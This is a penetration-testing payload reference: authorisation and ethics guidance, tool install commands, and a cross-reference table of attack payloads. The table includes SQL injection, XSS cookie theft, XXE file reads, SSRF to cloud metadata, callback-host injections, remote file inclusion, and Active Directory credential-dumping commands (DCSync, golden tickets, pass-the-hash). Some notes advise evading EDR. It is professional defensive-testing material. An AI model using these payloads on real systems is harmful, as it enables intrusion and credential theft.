# PAYLOAD REFERENCE BOOK
## Professional Penetration Testing Payload Reference
**Version 1.0 | 2026**

*The execution layer for authorised penetration testing engagements.*
*Part of the Penetration Testing Reference Suite.*

---

> **Companion volumes:**
> Penetration Testing Playbook v3 | SE Handbook | Remediation Handbook | Campaign Guide

---

---

# RESPONSIBLE USE STATEMENT

This book documents techniques, payloads, and commands used in professional penetration testing engagements. It exists to help security practitioners work efficiently, document findings clearly, and improve the security posture of organisations that have authorised this testing.

## Authorisation Requirement

**Every technique in this book requires written authorisation from the system owner before use.** Penetration testing without authorisation is a criminal offence in every jurisdiction where professional security testing is practised. There are no exceptions. There are no grey areas.

Before beginning any test:

1. A signed Penetration Test Authorisation Letter must exist (template in Appendix G).
2. The Rules of Engagement must be agreed and signed by both parties (template in Appendix G).
3. The scope must be clearly defined — systems in scope, systems explicitly out of scope, test dates, and permitted techniques.
4. Emergency contacts must be established on both sides.

Keep copies of all authorisation documents for the duration of the engagement and for a minimum of seven years after.

## Techniques Documented Here

All techniques documented in this book are:

- Publicly known and independently documented in academic literature, vendor advisories, or security research.
- Referenced against CVE identifiers, OWASP Top 10, MITRE ATT&CK, or equivalent public frameworks where applicable.
- Standard practice in the professional penetration testing industry.

No zero-day or privately held exploitation techniques are documented here. This is a practitioner reference, not an offensive research publication.

## Liability

The authors and publisher of this reference accept no liability for use outside authorised scope. Misuse of techniques documented here is the sole responsibility of the individual who deploys them. Professional penetration testers operate under contracts that define liability; ensure your engagement contract addresses indemnification for testing activities conducted within authorised scope.

## Legal Framework

Testing conducted using this reference must comply with applicable law in your jurisdiction. Key frameworks include:

- **Australia:** Criminal Code Act 1995 (Cth) ss 477–478; Cybercrime Act 2001; Privacy Act 1988
- **United States:** Computer Fraud and Abuse Act (CFAA) 18 U.S.C. § 1030; Electronic Communications Privacy Act
- **European Union:** NIS2 Directive (2022/2555); Budapest Convention on Cybercrime; GDPR where personal data is accessed
- **United Kingdom:** Computer Misuse Act 1990 (as amended); Data Protection Act 2018

This list is not exhaustive. Consult legal counsel if testing spans jurisdictions or involves systems subject to sector-specific regulation (finance, healthcare, critical infrastructure).

## Ethical Framework

Professional penetration testers operate under an ethical obligation beyond legal compliance. This reference assumes you adhere to the following principles:

- **Full disclosure:** Findings are reported completely and accurately to the client. Nothing is omitted to protect a vendor relationship, and nothing is exaggerated to inflate perceived value.
- **Minimum footprint:** Use the least intrusive technique that produces evidence of the vulnerability. Do not install persistent backdoors, do not exfiltrate actual PII beyond proof-of-concept, do not cause service disruption unless explicitly authorised.
- **Report completely:** Every finding, including informational and low-severity issues, is documented. The client pays for complete visibility, not a curated highlight reel.
- **Verify fixes:** Where a retest is in scope, test that the remediation actually addresses the root cause, not just the surface symptom.
- **Protect the data:** Destroy all captured credentials, hashes, and sensitive data after the report is delivered, per the agreed data handling clause in your contract.

If you encounter evidence of an active compromise by a third party during your test, stop and notify the client immediately. Your job is to find vulnerabilities, not to conduct incident response — unless that is also in scope and you are qualified to do it.

---

---

# HOW TO USE THIS BOOK

## Purpose and Position in the Reference Suite

This book is one of five volumes in the Penetration Testing Reference Suite. Each volume covers a distinct layer of a professional engagement:

| Book | Purpose | Use It When |
|------|---------|-------------|
| **Penetration Testing Playbook v3** | Methodology — how to structure and approach a test | Planning, scoping, and deciding what to test in what order |
| **Payload Reference Book** *(this volume)* | Execution — the actual commands, payloads, and syntax | You know what to test and need the exact command to run it |
| **SE Handbook** | Social engineering methodology and scripts | Testing human vectors: phishing, vishing, physical access |
| **Remediation Handbook** | How to fix every class of vulnerability | Writing remediation recommendations and verifying fixes |
| **Campaign Guide** | How to run a full engagement using all four books together | Managing a multi-week red team or comprehensive pentest |

The Playbook answers the question "what should I test next?" The Payload Book answers "what do I actually type?" The Remediation Handbook answers "what do I tell the client to do?" The Campaign Guide answers "how do I run this whole thing professionally?"

**Do not use this book without authorisation in place.** The Playbook has the scoping and authorisation methodology. If you have not read that section, do so first.

## Book Structure

This reference is organised into nineteen sections by vulnerability or attack category. Within each section you will find:

- A brief description of the vulnerability class
- Prerequisites (what you need to know about the target before using these payloads)
- Payloads, commands, and one-liners grouped by tool or technique
- Notes on what output indicates a vulnerable target
- Cross-references to the Remediation Handbook

The sections are:

| Section | Category |
|---------|---------|
| 1 | SQL Injection |
| 2 | Cross-Site Scripting (XSS) |
| 3 | Server-Side Template Injection (SSTI) |
| 4 | XML External Entity (XXE) |
| 5 | Server-Side Request Forgery (SSRF) |
| 6 | Path Traversal and Local File Inclusion |
| 7 | Command Injection (CMDi) |
| 8 | Authentication, JWT, and Session Attacks |
| 9 | Insecure Deserialisation |
| 10 | HTTP Request Smuggling and CORS |
| 11 | Password Attacks and Credential Cracking |
| 12 | Network Enumeration and Service Attacks |
| 13 | Active Directory Attacks |
| 14 | SMB, RPC, and Windows Lateral Movement |
| 15 | Linux Privilege Escalation |
| 16 | Windows Privilege Escalation |
| 17 | Social Engineering Payloads |
| 18 | Wireless (WPA2/WPA3, Bluetooth) |
| 19 | Web Miscellaneous (GraphQL, WebSockets, Open Redirect, IDOR) |

The appendices (A–G) at the back of this volume provide cross-reference tables, checklists, infrastructure setup, wordlist references, hash identification, and legal templates.

## Notation Conventions

Throughout this book, the following conventions apply:

**Code blocks** contain commands exactly as you would type them at the terminal or paste into a tool.

```bash
example command --flag value
```

**Replacement variables** appear in square brackets in ALL CAPS. Replace these with the actual value for your engagement before running.

```
[TARGET_IP]       — the IP address or hostname of the target system
[YOUR_IP]         — the IP address of your attack machine
[PORT]            — the port number
[USERNAME]        — a username or account name
[PASSWORD]        — a password or passphrase
[DOMAIN]          — the Active Directory domain name (e.g., CORP.LOCAL)
[DC_IP]           — the IP address of a Domain Controller
[HASH]            — an NTLM hash (format: LM:NT or just NT portion)
[URL]             — a full URL including protocol
[PATH]            — a file system path
[WORDLIST]        — path to a wordlist file
[CALLBACK_HOST]   — your out-of-band callback domain or Burp Collaborator URL
```

**Tool references** appear in backticks: `nmap`, `sqlmap`, `msfconsole`. Where a specific module path is required, it is written in full: `exploit/multi/handler`.

**Risk indicators** appear at the start of payloads that may cause service disruption or have a high detection profile. These are labelled:

- `[NOISY]` — likely to generate alerts in a mature SOC
- `[DISRUPTIVE]` — may cause service instability; confirm with client before running
- `[DESTRUCTIVE]` — permanently alters or destroys data; do not run without explicit authorisation in the RoE

**OOB** means Out-of-Band — techniques that require a callback to an external host to confirm execution. See Appendix E for OOB infrastructure setup.

## Setting Up Your Testing Environment

This book assumes a Kali Linux attack box. Most payloads will work on any Debian-based Linux distribution with the relevant tools installed. Windows-native tooling (Rubeus, Mimikatz, SharpHound) is noted where applicable and assumes you have a foothold on a Windows host.

**Recommended base setup:**

```bash
# Update your base system
sudo apt update && sudo apt full-upgrade -y

# Install core tools (most pre-installed on Kali)
sudo apt install -y nmap nikto sqlmap gobuster ffuf hydra john hashcat responder evil-winrm

# Python tools
pip3 install impacket bloodhound certipy-ad

# Git-based tools
git clone https://github.com/dirkjanm/BloodHound.py /opt/bloodhound-py
git clone https://github.com/gentilkiwi/mimikatz /opt/mimikatz  # Windows binary
git clone https://github.com/GhostPack/Rubeus /opt/rubeus       # compile on Windows

# Verify core tools
nmap --version
sqlmap --version
hydra -h | head -5
msfconsole --version
```

For tool-by-tool installation, see the **Core Tool Installation Reference** section below.

## Keeping a Test Journal

Every command you run during a test must be logged. This is not optional. The journal is your proof of work, your report source material, and your legal defence if a client disputes what was tested.

Minimum journal entry format:

```
TIMESTAMP   : 2026-03-10 09:32:14 ACST
TARGET      : 192.168.1.45 (web01.corp.local)
TOOL        : sqlmap
COMMAND     : sqlmap -u "http://192.168.1.45/search?q=test" --dbs --batch
OUTPUT      : [snippet or "see output_20260310_0932.txt"]
RESULT      : Vulnerable — databases enumerated: [corp_db, master, tempdb]
SECTION REF : Section 1 — SQL Injection
```

Keep raw tool output in dated files alongside your journal. A simple structure:

```
engagement_[CLIENT]_[DATE]/
    journal.md
    outputs/
        nmap_initial_[TIMESTAMP].txt
        sqlmap_web01_[TIMESTAMP].txt
        bloodhound_[TIMESTAMP].zip
    screenshots/
    loot/           # hashes, credentials — encrypt and delete after report
    report/
```

Never store engagement data on a personal cloud service. Use encrypted volumes (LUKS on Linux, VeraCrypt) for loot directories.

---

---

# CORE TOOL INSTALLATION REFERENCE

This section provides install commands, verification commands, and notes for every major tool referenced in this book. Tools marked **[KALI]** are pre-installed on Kali Linux. Verify before attempting to install.

---

## Burp Suite Community / Pro

**Purpose:** Web application proxy, scanner, intruder, repeater, decoder.

```bash
# Kali — pre-installed as burpsuite
burpsuite &

# Manual install (Community)
wget "https://portswigger.net/burp/releases/download?product=community&type=Linux" -O burpsuite_community.sh
chmod +x burpsuite_community.sh
./burpsuite_community.sh

# Verification
burpsuite --version 2>/dev/null || echo "Launch GUI to verify"
```

**Notes:** Configure Firefox or Chromium to proxy through 127.0.0.1:8080. Import Burp CA cert into browser to intercept HTTPS. Pro licence required for the active scanner, Collaborator, and certain Intruder attack types. Community is sufficient for manual testing.

---

## Metasploit Framework

**Purpose:** Exploitation framework, post-exploitation, payload generation, multi/handler listener.

```bash
# Kali — pre-installed
msfconsole

# Install on Ubuntu/Debian
curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall
chmod +x msfinstall
sudo ./msfinstall

# Update
sudo msfupdate

# Verification
msfconsole --version
# Expected: Framework Version: 6.x.x
```

**Notes:** First run initialises the database (PostgreSQL). Use `db_nmap` inside msfconsole to store scan results. `search` command finds modules. `use exploit/[module]`, `set RHOSTS [TARGET_IP]`, `run`.

---

## Nmap

**Purpose:** Network discovery, port scanning, service version detection, NSE scripts.

```bash
# Kali — pre-installed [KALI]
# Install
sudo apt install -y nmap

# Verification
nmap --version
# Expected: Nmap version 7.9x
```

**Notes:** Run as root for SYN scans (`-sS`). Key flags: `-sV` (version), `-sC` (default scripts), `-O` (OS detection), `-A` (all), `-p-` (all 65535 ports), `--open` (show only open ports). NSE scripts in `/usr/share/nmap/scripts/`.

---

## Nikto

**Purpose:** Web server vulnerability scanner — misconfigurations, outdated software, dangerous files.

```bash
# Kali — pre-installed [KALI]
# Install
sudo apt install -y nikto

# Verification
nikto -Version
```

**Notes:** `[NOISY]` — Nikto is loud and will trip most IDS/WAF. Always confirm with client that scanning is permitted. Use `-h [URL]` for basic scan, `-ssl` for HTTPS targets, `-Tuning x` to filter scan types.

---

## SQLmap

**Purpose:** Automated SQL injection detection and exploitation.

```bash
# Kali — pre-installed [KALI]
# Install
sudo apt install -y sqlmap
# or
pip3 install sqlmap

# Verification
sqlmap --version
```

**Notes:** Use `--batch` for non-interactive runs. `--level` (1-5) and `--risk` (1-3) control aggressiveness. `--dbs` enumerates databases, `--tables -D [DB]` enumerates tables, `--dump -T [TABLE] -D [DB]` extracts data. Use `--tamper` scripts to bypass WAF filters.

---

## Gobuster / ffuf

**Purpose:** Web content discovery — directory and file bruteforcing, virtual host enumeration, DNS subdomain bruteforcing.

```bash
# Gobuster
sudo apt install -y gobuster
gobuster version

# ffuf
sudo apt install -y ffuf
# or
go install github.com/ffuf/ffuf/v2@latest

ffuf -V
```

**Notes:** Gobuster is reliable for directory bruteforcing (`dir` mode), DNS (`dns` mode), and vhosts (`vhost` mode). ffuf is faster and more flexible — use `FUZZ` keyword in URLs, headers, or POST bodies. Both require a wordlist; see Appendix D.

---

## Hydra

**Purpose:** Online password bruteforcing — supports HTTP, SSH, FTP, SMB, RDP, and 50+ protocols.

```bash
# Kali — pre-installed [KALI]
sudo apt install -y hydra

# Verification
hydra -h 2>&1 | head -3
```

**Notes:** `[NOISY]` — lockout policies will trigger on most production systems. Always confirm account lockout threshold before running. Use `-t` to control threads (lower = quieter). Key syntax: `hydra -l [USERNAME] -P [WORDLIST] [TARGET_IP] [SERVICE]`.

---

## John the Ripper

**Purpose:** Offline hash cracking — auto-detects many hash types, supports wordlists and rules.

```bash
# Kali — pre-installed [KALI]
sudo apt install -y john

# Jumbo version (more formats)
git clone https://github.com/openwall/john /opt/john
cd /opt/john/src && ./configure && make -s clean && make -sj4
sudo ln -s /opt/john/run/john /usr/local/bin/john

# Verification
john --list=formats | head -20
```

**Notes:** Use `john --format=[FORMAT] --wordlist=[WORDLIST] [HASHFILE]`. Common formats: `nt`, `sha512crypt`, `bcrypt`, `krb5tgs` (Kerberoasting). `john --show [HASHFILE]` shows cracked passwords. Pass results to `hashcat` for GPU-accelerated cracking.

---

## Hashcat

**Purpose:** GPU-accelerated offline hash cracking — significantly faster than John for large hash sets.

```bash
# Kali — pre-installed [KALI]
sudo apt install -y hashcat

# Verification
hashcat --version

# List supported hash modes
hashcat --example-hashes | grep -A2 "MODE"

# Identify an unknown hash
hashcat --identify [HASHFILE]
```

**Notes:** Requires a GPU for full performance. Works on CPU but much slower. Use `-m [MODE]` for hash type (see Appendix F for full mode table), `-a 0` for wordlist attack, `-a 3` for mask/brute-force attack, `-r` for rule files. Add `--force` on VMs where GPU is unavailable.

---

## Responder

**Purpose:** NBT-NS/LLMNR/mDNS poisoning — captures NTLMv2 hashes from Windows hosts on the local network.

```bash
# Kali — pre-installed [KALI]
# Also available:
git clone https://github.com/lgandx/Responder /opt/responder

# Verification
python3 /opt/responder/Responder.py --version 2>/dev/null || responder --version
```

**Notes:** Requires local network access (same broadcast domain as target). Run as root. `[NOISY]` — generates traffic that security tools detect. Default command: `sudo responder -I eth0 -wrf`. Captures go to `/opt/responder/logs/`. Crack with hashcat `-m 5600` (NTLMv2).

---

## Impacket Suite

**Purpose:** Python library and collection of scripts for Windows/AD network protocols — SMB, Kerberos, LDAP, DCE/RPC.

```bash
# Install
pip3 install impacket

# Or from source (for latest)
git clone https://github.com/fortra/impacket /opt/impacket
cd /opt/impacket && pip3 install .

# Verification — key scripts
GetUserSPNs.py --help 2>&1 | head -5
secretsdump.py --help 2>&1 | head -5
psexec.py --help 2>&1 | head -5
```

**Key scripts in the suite:**

| Script | Purpose |
|--------|---------|
| `GetUserSPNs.py` | Kerberoasting — retrieve TGS tickets for cracking |
| `GetNPUsers.py` | AS-REP roasting — get hashes for accounts with pre-auth disabled |
| `secretsdump.py` | Remote SAM, LSA, NTDS.dit dump |
| `psexec.py` | SMB exec via service creation |
| `wmiexec.py` | WMI-based exec (quieter than psexec) |
| `smbexec.py` | SMB exec via scheduled service |
| `ntlmrelayx.py` | NTLM relay attacks |
| `ticketer.py` | Golden/Silver ticket creation |
| `lookupsid.py` | SID brute-force for domain enumeration |
| `reg.py` | Remote registry interaction |

---

## BloodHound + SharpHound

**Purpose:** Active Directory attack path visualisation. SharpHound collects data; BloodHound visualises attack paths to Domain Admin.

```bash
# BloodHound (GUI — requires Neo4j)
sudo apt install -y bloodhound neo4j

# Start Neo4j
sudo neo4j start
# Change default password at http://localhost:7474 (neo4j:neo4j → set new password)

# Start BloodHound
bloodhound &

# BloodHound Python ingestor (remote collection — no Windows binary needed)
pip3 install bloodhound
bloodhound-python -u [USERNAME] -p [PASSWORD] -d [DOMAIN] -c All -ns [DC_IP]

# SharpHound (Windows binary — run on a domain-joined host)
# Download: https://github.com/BloodHoundAD/SharpHound
.\SharpHound.exe -c All --outputdirectory C:\Temp\

# Verification
bloodhound --version
```

**Notes:** Import SharpHound or BloodHound.py JSON output into BloodHound GUI. Key queries: "Find Shortest Paths to Domain Admins", "Find Principals with DCSync Rights", "Find Computers where Domain Users are Local Admin".

---

## Rubeus

**Purpose:** Windows Kerberos toolkit — Kerberoasting, AS-REP roasting, Pass-the-Ticket, overpass-the-hash, ticket renewal.

```bash
# Compile from source on Windows (requires Visual Studio or MSBuild)
git clone https://github.com/GhostPack/Rubeus C:\Tools\Rubeus
# Build in Visual Studio — output: Rubeus\bin\Release\Rubeus.exe

# Pre-compiled binaries available from trusted red team tool repos
# Verify after download
.\Rubeus.exe --help

# Alternative: run via execute-assembly in Cobalt Strike / msfconsole
```

**Notes:** Windows-only. Must be run from a domain context for most attacks. Defender and most EDR products detect Rubeus without obfuscation — plan accordingly. For lab use, add exclusions. For production engagements, use with appropriate evasion.

---

## Mimikatz

**Purpose:** Windows credential extraction — LSASS dump, Pass-the-Hash, Pass-the-Ticket, Golden Ticket, Silver Ticket.

```bash
# Pre-compiled binary: https://github.com/gentilkiwi/mimikatz/releases
# Extract to C:\Tools\mimikatz\

# Run on target (requires SYSTEM or Debug privilege)
.\mimikatz.exe

# Verification inside mimikatz console:
privilege::debug
# Expected: Privilege '20' OK
```

**Notes:** `[NOISY]` — AV/EDR will flag mimikatz by name and most signatures. Use obfuscated variants (SafetyKatz, Out-Minidump pattern) for real engagements. Core commands: `sekurlsa::logonpasswords`, `lsadump::sam`, `lsadump::dcsync`, `kerberos::golden`, `kerberos::silver`.

---

## CrackMapExec (cme / nxc)

**Purpose:** Post-exploitation Swiss army knife for Active Directory environments — authentication testing, command execution, credential spraying, module execution across SMB/WinRM/MSSQL/LDAP.

```bash
# NetExec (nxc) — maintained fork of CrackMapExec
pip3 install netexec

# Verification
nxc --version
nxc smb --help | head -10

# Legacy CrackMapExec
pip3 install crackmapexec
cme --version
```

**Notes:** Most modern documentation uses `nxc` (NetExec). The command syntax is identical to `cme`. Supports SMB, WinRM, SSH, LDAP, MSSQL, FTP, RDP protocols. Key use cases: password spraying (`--continue-on-success`), checking admin access (`(Pwn3d!)`), running commands (`-x`), dumping hashes (`--sam`, `--ntds`).

---

## evil-winrm

**Purpose:** WinRM shell for Windows remote management — interactive shell over WinRM using credentials or NTLM hash.

```bash
# Install
gem install evil-winrm

# Verification
evil-winrm --version
```

**Notes:** WinRM listens on port 5985 (HTTP) or 5986 (HTTPS). Target must have WinRM enabled and user must be in the Remote Management Users group or Administrators. Supports Pass-the-Hash with `-H [NTLM_HASH]`, file upload/download, and loading PowerShell scripts with `-s`.

---

## PowerView / PowerSploit

**Purpose:** PowerShell-based AD enumeration and exploitation — domain enumeration, ACL abuse, local admin discovery, share hunting.

```bash
# Download PowerSploit (includes PowerView)
git clone https://github.com/PowerShellMafia/PowerSploit C:\Tools\PowerSploit

# PowerView standalone
# Download: https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1

# Load in PowerShell on target (bypass execution policy)
powershell -ep bypass
Import-Module C:\Tools\PowerSploit\Recon\PowerView.ps1

# Verification
Get-NetDomain
```

**Notes:** PowerView is detection-prone without AMSI bypass. For engagements with mature EDR, use the `dev` branch or alternative enumeration (BloodHound.py, ldapdomaindump). Key functions: `Get-NetUser`, `Get-NetGroup`, `Get-NetComputer`, `Find-LocalAdminAccess`, `Invoke-ACLScanner`.

---

## Certify / Certipy (ADCS)

**Purpose:** Active Directory Certificate Services (ADCS) enumeration and exploitation — ESC1 through ESC8 attack vectors.

```bash
# Certipy (Python — attack from Linux)
pip3 install certipy-ad

certipy --version

# Certify (Windows C# — run on domain-joined host)
# Compile from: https://github.com/GhostPack/Certify
.\Certify.exe find /vulnerable

# Verification
certipy find -u [USERNAME]@[DOMAIN] -p [PASSWORD] -dc-ip [DC_IP]
```

**Notes:** ADCS attacks (ESC1, ESC8) can result in domain compromise via certificate misuse. ESC1 allows any user to request a certificate on behalf of any other user including Domain Admins. ESC8 exploits the HTTP endpoint with NTLM relay. See Section 13 for full attack chains.

---

## hcxdumptool + hcxtools

**Purpose:** WPA2/WPA3 handshake and PMKID capture for offline cracking.

```bash
# Install
sudo apt install -y hcxdumptool hcxtools

# Verification
hcxdumptool --version
hcxtools --version 2>/dev/null || hcxpcapngtool --version
```

**Notes:** Requires a wireless adapter that supports monitor mode and packet injection. `hcxdumptool` captures PMKID and EAPOL handshakes. `hcxpcapngtool` converts captures to hashcat format. `[DISRUPTIVE]` — deauthentication frames will temporarily disconnect clients from the AP. Confirm wireless testing is in scope and client is aware of potential disruption.

---

## aircrack-ng Suite

**Purpose:** Complete 802.11 wireless testing suite — monitor mode, packet capture, injection, WEP/WPA cracking.

```bash
# Install
sudo apt install -y aircrack-ng

# Verification
aircrack-ng --version
```

**Key tools in the suite:**

| Tool | Purpose |
|------|---------|
| `airmon-ng` | Enable/disable monitor mode on wireless interface |
| `airodump-ng` | Capture 802.11 frames, list nearby networks and clients |
| `aireplay-ng` | Packet injection — deauth, fake authentication, ARP replay |
| `aircrack-ng` | Crack WEP keys and WPA2 handshakes |
| `airdecap-ng` | Decrypt captured WEP/WPA/WPA2 traffic |

**Notes:** `[DISRUPTIVE]` — deauth attacks (`aireplay-ng -0`) will disconnect clients. Always confirm wireless testing scope before running active attacks. Some jurisdictions restrict use of packet injection tools to licensed spectrum, regardless of authorisation from the network owner.

---

---

# APPENDIX A: VULNERABILITY → PAYLOAD → TOOL CROSS-REFERENCE TABLE

This table maps every major vulnerability category covered in this book to its section, a representative payload or command, the primary tool used, and the corresponding section in the Remediation Handbook.

| Vulnerability | Section | Key Payload / Command | Primary Tool | Remediation Handbook §|
|--------------|---------|----------------------|-------------|----------------------|
| SQL Injection (Error-based) | 1.1 | `' OR 1=1--` | `sqlmap`, Burp Repeater | RH §3.1 |
| SQL Injection (Blind Boolean) | 1.2 | `' AND 1=1--` / `' AND 1=2--` | `sqlmap --level=2` | RH §3.1 |
| SQL Injection (Time-based Blind) | 1.3 | `'; WAITFOR DELAY '0:0:5'--` | `sqlmap --technique=T` | RH §3.1 |
| SQL Injection (UNION-based) | 1.4 | `' UNION SELECT NULL,NULL,NULL--` | `sqlmap`, manual | RH §3.1 |
| SQL Injection (Out-of-Band) | 1.5 | `'; exec xp_dirtree '//[CALLBACK_HOST]/a'--` | Burp Collaborator | RH §3.1 |
| Reflected XSS | 2.1 | `<script>alert(1)</script>` | Burp Scanner, `dalfox` | RH §3.2 |
| Stored XSS | 2.2 | `<img src=x onerror=alert(document.cookie)>` | Burp Scanner, manual | RH §3.2 |
| DOM-based XSS | 2.3 | `#<img src=x onerror=alert(1)>` | Burp DOM Invader | RH §3.2 |
| SSTI (Jinja2/Python) | 3.1 | `{{7*7}}` / `{{config}}` | `tplmap`, manual | RH §3.3 |
| SSTI (Twig/PHP) | 3.2 | `{{7*'7'}}` | `tplmap`, manual | RH §3.3 |
| SSTI (Freemarker/Java) | 3.3 | `${7*7}` | `tplmap`, manual | RH §3.3 |
| SSTI (Velocity/Java) | 3.4 | `#set($x=7*7)${x}` | Manual | RH §3.3 |
| XXE (Classic) | 4.1 | `<!ENTITY xxe SYSTEM "file:///etc/passwd">` | Burp Repeater | RH §3.4 |
| XXE (Blind OOB) | 4.2 | DTD with external SYSTEM to callback host | Burp Collaborator | RH §3.4 |
| XXE (SSRF via XXE) | 4.3 | `SYSTEM "http://169.254.169.254/"` | Burp Repeater | RH §3.4 |
| SSRF (Basic) | 5.1 | `url=http://169.254.169.254/latest/meta-data/` | Burp Repeater | RH §3.5 |
| SSRF (Blind) | 5.2 | `url=http://[CALLBACK_HOST]/` | Burp Collaborator | RH §3.5 |
| SSRF (Protocol Smuggling) | 5.3 | `url=dict://127.0.0.1:6379/` | Manual | RH §3.5 |
| Path Traversal | 6.1 | `../../etc/passwd` | Burp Repeater, `ffuf` | RH §3.6 |
| Path Traversal (Encoded) | 6.2 | `..%2F..%2Fetc%2Fpasswd` | Burp Intruder | RH §3.6 |
| Local File Inclusion | 6.3 | `?page=../../../../etc/passwd` | `ffuf`, manual | RH §3.6 |
| Remote File Inclusion | 6.4 | `?page=http://[YOUR_IP]/shell.txt` | Manual | RH §3.6 |
| Command Injection (Linux) | 7.1 | `; id` / `\| id` / `$(id)` | Burp Repeater | RH §3.7 |
| Command Injection (Windows) | 7.2 | `& whoami` / `\| whoami` | Burp Repeater | RH §3.7 |
| Command Injection (Blind) | 7.3 | `; ping -c 1 [CALLBACK_HOST]` | Burp Collaborator | RH §3.7 |
| JWT None Algorithm | 8.1 | Modify `alg: none`, remove signature | `jwt_tool`, manual | RH §3.8 |
| JWT Algorithm Confusion (RS256→HS256) | 8.2 | Sign with public key as HMAC secret | `jwt_tool -X k` | RH §3.8 |
| JWT Weak Secret | 8.3 | `hashcat -m 16500 [JWT_HASH] [WORDLIST]` | `hashcat`, `jwt_tool` | RH §3.8 |
| Insecure Deserialization (Java) | 9.1 | ysoserial payloads via `CommonsCollections` chain | `ysoserial`, manual | RH §3.9 |
| Insecure Deserialization (PHP) | 9.2 | Crafted serialized object with POP chain | Manual | RH §3.9 |
| Insecure Deserialization (.NET) | 9.3 | ysoserial.net TypeConfuseDelegate | `ysoserial.net` | RH §3.9 |
| HTTP Request Smuggling (CL.TE) | 10.1 | CL.TE smuggling via Burp | Burp HTTP Smuggler | RH §3.10 |
| HTTP Request Smuggling (TE.CL) | 10.2 | TE.CL variant | Burp HTTP Smuggler | RH §3.10 |
| CORS Misconfiguration | 10.3 | `Origin: https://evil.com` header | Burp Repeater | RH §3.10 |
| Open Redirect | 19.1 | `?redirect=https://evil.com` | Manual, `ffuf` | RH §3.11 |
| GraphQL Introspection | 19.2 | `{__schema{types{name}}}` | `graphw00f`, Burp | RH §3.12 |
| GraphQL Injection | 19.3 | Nested query abuse / batching DoS | Burp Repeater | RH §3.12 |
| IDOR | 19.4 | Increment `id=` parameter, change UUID | Burp Intruder | RH §3.13 |
| WebSocket Attacks | 19.5 | Intercept + modify WS message | Burp WebSockets | RH §3.14 |
| Password Spraying | 11.1 | `nxc smb [TARGET_IP] -u users.txt -p [PASSWORD] --continue-on-success` | `nxc`, `kerbrute` | RH §4.1 |
| Credential Stuffing | 11.2 | `hydra -L users.txt -P passes.txt [TARGET_IP] http-post-form` | `hydra` | RH §4.1 |
| Hash Cracking (NTLM) | 11.3 | `hashcat -m 1000 [HASHFILE] [WORDLIST]` | `hashcat` | RH §4.2 |
| Network Service Enumeration | 12.1 | `nmap -sV -sC -p- [TARGET_IP]` | `nmap` | RH §4.3 |
| SMB Null Session | 14.1 | `smbclient -L //[TARGET_IP]/ -N` | `smbclient`, `nxc` | RH §4.4 |
| SMB Signing Disabled | 14.2 | `nxc smb [SUBNET] --gen-relay-list targets.txt` | `nxc`, `ntlmrelayx.py` | RH §4.4 |
| AD Enumeration (LDAP) | 13.1 | `ldapsearch -x -H ldap://[DC_IP] -b "DC=[DOMAIN]"` | `ldapsearch`, BloodHound | RH §4.5 |
| Kerberoasting | 13.2 | `GetUserSPNs.py [DOMAIN]/[USER]:[PASS] -dc-ip [DC_IP] -request` | `impacket`, Rubeus | RH §4.5 |
| AS-REP Roasting | 13.3 | `GetNPUsers.py [DOMAIN]/ -usersfile users.txt -no-pass -dc-ip [DC_IP]` | `impacket` | RH §4.5 |
| NTLM Relay | 13.4 | `ntlmrelayx.py -tf targets.txt -smb2support` | `impacket`, Responder | RH §4.6 |
| Pass-the-Hash | 13.5 | `psexec.py [DOMAIN]/[USER]@[TARGET_IP] -hashes [LMHASH]:[NTHASH]` | `impacket`, `nxc` | RH §4.6 |
| Pass-the-Ticket | 13.6 | `.\Rubeus.exe ptt /ticket:[BASE64_TICKET]` | Rubeus | RH §4.6 |
| DCSync | 13.7 | `secretsdump.py [DOMAIN]/[USER]:[PASS]@[DC_IP]` | `impacket`, Mimikatz | RH §4.7 |
| Golden Ticket | 13.8 | `ticketer.py -nthash [KRBTGT_HASH] -domain-sid [SID] -domain [DOMAIN] Administrator` | `impacket`, Mimikatz | RH §4.7 |
| Silver Ticket | 13.9 | `ticketer.py -nthash [SERVICE_HASH] -domain-sid [SID] -domain [DOMAIN] -spn [SPN] [USER]` | `impacket`, Mimikatz | RH §4.7 |
| ADCS ESC1 | 13.10 | `certipy req -u [USER]@[DOMAIN] -p [PASS] -ca [CA_NAME] -template [TEMPLATE] -upn Administrator@[DOMAIN]` | `certipy` | RH §4.8 |
| ADCS ESC8 | 13.11 | `ntlmrelayx.py -t http://[CA_HOST]/certsrv/certfnsh.asp --adcs --template DomainController` | `impacket`, `certipy` | RH §4.8 |
| Linux Privilege Escalation (SUID) | 15.1 | `find / -perm -u=s -type f 2>/dev/null` | Manual, `linpeas.sh` | RH §5.1 |
| Linux Privilege Escalation (Sudo) | 15.2 | `sudo -l` → GTFOBins | `linpeas.sh`, manual | RH §5.1 |
| Linux Privilege Escalation (Cron) | 15.3 | `cat /etc/crontab`, writable script abuse | `linpeas.sh` | RH §5.1 |
| Windows Privilege Escalation (Service) | 16.1 | Unquoted service path, weak permissions | `winpeas.exe`, `PowerUp.ps1` | RH §5.2 |
| Windows Privilege Escalation (Token) | 16.2 | PrintSpoofer, RoguePotato, JuicyPotato | `winpeas.exe` | RH §5.2 |
| WPA2 Handshake Capture + Crack | 18.1 | `airmon-ng start [IFACE]` → `airodump-ng` → `aireplay-ng -0` | `aircrack-ng`, `hashcat -m 22000` | RH §6.1 |
| PMKID Attack (WPA2) | 18.2 | `hcxdumptool -i [IFACE] -o capture.pcapng` | `hcxdumptool`, `hashcat` | RH §6.1 |
| Bluetooth Recon | 18.3 | `hcitool scan`, `btlejack`, `bettercap ble.recon on` | `bettercap`, `bluetoothctl` | RH §6.2 |
| Phishing (Email) | 17.1 | GoPhish campaign with credential harvester | `GoPhish`, Evilginx2 | RH §7.1 |
| Vishing | 17.2 | Script + caller ID spoofing | SE Handbook §4 | RH §7.2 |
| USB Drop | 17.3 | HID attack payload (Rubber Ducky / Bash Bunny) | USB attack tools | RH §7.3 |

---

# APPENDIX B: ATTACK SURFACE → BOOK MAPPING

This table shows which volume of the Penetration Testing Reference Suite to consult at each phase of an engagement.

| Phase | Primary Reference | Relevant Section |
|-------|------------------|-----------------|
| **Planning and Scoping** | Penetration Testing Playbook v3 | Playbook §1 — Scoping, ROE, legal checklist |
| **Reconnaissance (Passive)** | Penetration Testing Playbook v3 | Playbook §2 — OSINT methodology |
| **Reconnaissance (Active)** | Payload Reference Book *(this volume)* | §12 — Network Enumeration |
